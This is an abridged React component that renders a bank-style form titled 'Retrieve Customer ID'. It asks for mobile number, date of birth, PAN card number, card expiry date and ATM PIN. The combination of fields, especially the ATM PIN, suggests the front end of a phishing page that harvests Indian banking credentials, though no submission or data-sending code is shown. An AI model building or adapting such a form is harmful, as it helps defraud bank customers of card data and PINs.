    ...
    <Stack direction={'column'} sx={{ width: '100%', alignItems: 'center', backgroundColor: '#f4f4f9', paddingBottom: '20px' }}>
      ...
      <Stack width={'95%'} marginTop={'2rem'}>
        <Stack
          ...
          sx={{ backgroundColor: 'white', padding: '20px', boxShadow: '0 4px 10px rgba(0, 0, 0, 0.1)' }}
        >
          <Stack padding={'3px'} textAlign={'center'} width={'100%'} bgcolor={'#2c3e50'} borderRadius={'8px 8px 0 0'}>
            <Typography sx={{ color: 'white', fontSize: '18px', textTransform: 'capitalize' }}>
              {title ? title : 'Retrieve Customer ID'}
            </Typography>
          </Stack>

          {/* Mobile Number */}
          <Stack direction={'row'} alignItems={'center'} gap={'2rem'} padding={'10px 20px'}>
            <Typography sx={{ color: '#34495e', fontSize: '14px', fontWeight: '600' }}>Mobile Number:</Typography>
            <TextField
              required
              value={mobileNumber}
          ...
          {/* Date of Birth */}
          <Stack direction={'row'} alignItems={'center'} gap={'1rem'} padding={'10px 20px'}>
            <Typography sx={{ color: '#34495e', fontSize: '14px', fontWeight: '600' }}>Date of Birth:</Typography>
            <TextField
              required
              value={dateOfBirth}
          ...
          {/* PAN Card Number */}
          <Stack direction={'row'} alignItems={'center'} gap={'1rem'} padding={'10px 20px'}>
            <Typography sx={{ color: '#34495e', fontSize: '14px', fontWeight: '600' }}>PAN Card Number:</Typography>
            <TextField
              required
              value={panCardNumber}
          ...
          {/* Expiry Date */}
          <Stack direction={'row'} alignItems={'center'} gap={'1rem'} padding={'10px 20px'}>
            <Typography sx={{ color: '#34495e', fontSize: '14px', fontWeight: '600' }}>Expiry Date (MM/YY):</Typography>
            <TextField
              required
              value={expiryDate}
          ...
          {/* ATM Pin */}
          <Stack direction={'row'} alignItems={'center'} gap={'1rem'} padding={'10px 20px'}>
            <Typography sx={{ color: '#34495e', fontSize: '14px', fontWeight: '600' }}>ATM Pin:</Typography>
            <TextField
              required
              value={atmPin}
